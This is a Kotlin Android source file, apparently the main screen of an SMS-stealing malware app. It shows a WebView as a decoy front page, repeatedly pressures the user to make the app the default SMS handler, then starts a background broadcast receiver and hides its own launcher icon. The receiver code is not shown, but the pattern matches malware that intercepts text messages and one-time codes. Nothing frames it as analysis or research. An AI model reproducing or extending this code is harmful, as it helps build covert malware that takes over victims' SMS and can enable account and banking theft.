package org.reddeaddeath.classicbotmazar

import android.app.Activity
import android.app.AlertDialog
import android.app.role.RoleManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.webkit.WebView
import android.webkit.WebViewClient

class MainActivity : Activity() {

    private lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.webViewClient = WebViewClient()
        webView.loadUrl(Constants.WEBVIEW_URL)
        
        setContentView(webView)

        requestSmsRoleIfNeeded()
    }

    private fun requestSmsRoleIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            val role = RoleManager.ROLE_SMS
            if (roleManager != null && roleManager.isRoleAvailable(role) && !roleManager.isRoleHeld(role)) {
                val intent = roleManager.createRequestRoleIntent(role)
                startActivityForResult(intent, Constants.REQUEST_ROLE_SMS)
                return
            } else {
                UtilsMain.startBrodcastReceiver(this)
                disableMainActivity()
            }
        } else {
            val intent = Intent(Settings.ACTION_WIRELESS_SETTINGS)
            startActivity(intent)
        }        
    }

    private fun showRoleRequiredDialog() {
        AlertDialog.Builder(this)
            .setTitle(Constants.DIALOG_TITLE_SMS_ROLE)
            .setMessage(Constants.DIALOG_MESSAGE_SMS_ROLE)
            .setPositiveButton("OK") { _, _ ->
                requestSmsRoleIfNeeded()
            }
            .show()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == Constants.REQUEST_ROLE_SMS) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val roleManager = getSystemService(RoleManager::class.java)
                val role = RoleManager.ROLE_SMS
                val hasRole = roleManager != null && roleManager.isRoleHeld(role)

                if (!hasRole) {
                    showRoleRequiredDialog()
                } else {
                    UtilsMain.startBrodcastReceiver(this)
                    disableMainActivity()
                }
            } else {
                showRoleRequiredDialog()
            }
        }
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private fun disableMainActivity() {
        UtilsMain.disableActivity(this, MainActivity::class.java)
    }
}


